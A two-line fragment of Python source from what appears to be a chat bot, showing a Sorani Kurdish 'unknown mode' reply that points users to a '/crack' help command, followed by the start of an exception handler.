             reply(chat_id, "❓ مۆد نەناسراو — <code>/crack</code> بەتاڵ بنووسە بۆ یارمەتی")
     except Exception as e:
